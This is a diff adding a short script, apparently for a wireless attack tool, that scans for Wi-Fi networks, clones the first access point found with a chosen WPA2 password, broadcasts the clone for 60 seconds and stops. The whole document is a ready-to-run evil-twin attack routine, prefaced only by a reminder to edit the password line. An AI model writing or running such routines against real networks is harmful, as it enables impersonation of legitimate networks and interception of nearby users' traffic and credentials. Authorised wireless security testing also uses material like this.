@@ -1,0 +1,12 @@
+# module: wifi-evil-twin
+# desc: scan, clone first AP with a chosen WPA2 password, run for 60 s
+# Edit the `password` line below before running.
+
+scan
+sleep 6
+target 1
+password ChangeMe123
+auth wpa2
+start
+sleep 60
+stop
